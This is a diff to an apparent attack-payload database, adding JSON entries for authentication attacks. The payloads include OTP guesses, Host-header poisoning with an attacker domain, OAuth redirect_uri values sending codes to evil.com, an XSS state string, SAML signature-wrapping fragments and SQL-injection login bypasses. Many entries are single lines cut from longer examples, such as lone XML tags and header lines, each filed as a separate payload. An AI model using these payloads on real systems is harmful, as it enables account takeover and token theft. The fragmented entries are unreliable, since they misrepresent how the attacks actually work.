@@ -2979,5 +2979,1061 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-210846",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"otp\":[",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210847",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"1234\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210848",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"1111\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210849",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"1337\", // GOOD OTP",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210850",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"2222\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210851",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"3333\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210852",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"4444\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210853",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"5555\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210854",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "POST https://example.com/reset.php HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210856",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Host: [ATTACKER.DOMAIN.TLD]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210864",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "POST /api/changepass",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210866",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "(\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210867",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210868",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "X:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210869",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET /  HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210870",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Host: something.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210872",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Length: 83",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210873",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "X: X",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242580",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242581",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242582",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242583",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242584",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242585",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242652",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242653",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242654",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242655",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242656",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2p:Status>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242657",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242658",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242659",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242660",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242661",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242662",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:SubjectConfirmationData NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242663",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:SubjectConfirmation>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242664",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:Subject>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242665",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242666",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:AudienceRestriction>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242667",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Audience>WLS_SP</saml2:Audience>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242668",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:AudienceRestriction>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242669",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:Conditions>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242670",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\" SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242671",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:AuthnContext>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242672",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242673",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:AuthnContext>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242674",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:AuthnStatement>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242675",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:Assertion>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242676",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2p:Response>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242677",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<SAMLResponse>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242678",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<FA ID=\"evil\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242679",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Subject>Attacker</Subject>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242680",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</FA>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242681",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<LA ID=\"legitimate\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242682",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Subject>Legitimate User</Subject>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242683",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<LAS>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242684",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Reference Reference URI=\"legitimate\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242685",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</Reference>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242686",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</LAS>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242687",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</LA>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242688",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</SAMLResponse>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242689",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Issuer>https://idp.com/</Issuer>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242690",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Assertion ID=\"_id1234\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242691",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<Subject>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242692",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242694",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!ENTITY s \"s\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242695",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<!ENTITY f1 \"f1\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242696",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242700",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "IssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242701",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:Attribute FriendlyName=\"uid\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242704",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<saml2:AttributeValue>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242705",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&s;taf&f1;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242706",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:AttributeValue>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242707",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</saml2:Attribute>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242708",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242709",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ds:Transforms>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242710",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<ds:Transform>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242718",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</ds:Transform>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242719",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</ds:Transforms>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242720",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "</ds:Signature>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252098",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ADMIN\"--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252099",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ADMIN'--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252100",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "AdMiN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252101",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "AdMiN\"--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252102",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "AdMiN'--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252103",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "AdMiN'oR'1'='1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252104",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aDmIn",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252105",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aDmIn\"#",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252106",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aDmIn'#",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-252107",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "and 1=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
